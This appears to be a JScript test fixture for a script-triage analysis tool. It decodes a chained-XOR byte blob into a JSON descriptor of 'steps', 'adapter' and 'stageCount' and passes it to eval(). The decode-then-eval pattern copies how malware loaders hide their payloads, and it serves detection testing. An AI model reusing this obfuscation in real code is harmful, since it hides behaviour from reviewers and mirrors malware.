// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_ce09df30(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  var previous = 162;
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push(SoUrCeByTeS[i] ^ previous); previous = SoUrCeByTeS[i]; }
  return DeCoDeDByTeS;
}
function recover_a5229a91() {
  if (true) {
    var packedText = "217-251-136-252-153-233-154-184-130-217-251-154-249-136-253-148-230-131-220-174-203-166-201-189-216-250-214-244-144-249-138-250-155-239-140-228-187-214-179-222-177-195-186-152-197-233-203-170-206-175-223-171-206-188-158-164-134-203-162-193-179-220-175-192-166-210-252-164-233-165-237-185-237-189-159-179-145-231-134-234-159-250-137-171-145-234-200-171-202-167-215-182-223-184-214-137-224-132-166-156-190-221-188-209-161-192-169-206-160-141-184-128-181-132-226-215-238-139-238-217-251-215-245-128-242-158-188-134-164-204-184-204-188-207-245-218-245-192-248-205-252-154-175-150-243-150-161-143-234-146-243-158-238-130-231-201-160-206-184-217-181-220-184-151-160-150-166-144-166-199-254-203-229-129-224-148-182-154-184-205-190-219-169-246-151-240-149-251-143-173-151-181-253-136-230-146-224-133-246-133-201-168-202-229-208-232-221-236-138-191-134-227-134-177-147-238-194-224-147-231-134-225-132-199-168-221-179-199-229-223-237-144";
    var packedParts = packedText.split("-");
    var SoUrCeByTeS = [];
    for (var di = 0; di < packedParts.length; di++) { SoUrCeByTeS.push(parseInt(packedParts[di], 10)); }

    var DeCoDeDByTeS = [];
    for (var pass = 0; pass < 1; pass++) { DeCoDeDByTeS = decode_ce09df30.apply(null, [SoUrCeByTeS]); }
    var textParts = [];
    for (var bi = 0; bi < DeCoDeDByTeS.length; bi++) { textParts.push(String.fromCharCode(DeCoDeDByTeS[bi])); }
    var DeScRiPtOrTeXt = textParts.join("");
    return DeScRiPtOrTeXt;
  }
}
function inspect_5372943a() {
  var DeScRiPtOr = eval("(" + recover_a5229a91.apply(null, []) + ")");
  return { steps: DeScRiPtOr["steps"], adapter: DeScRiPtOr["adapter"], values: DeScRiPtOr["values"], stageCount: DeScRiPtOr["stageCount"] };
}
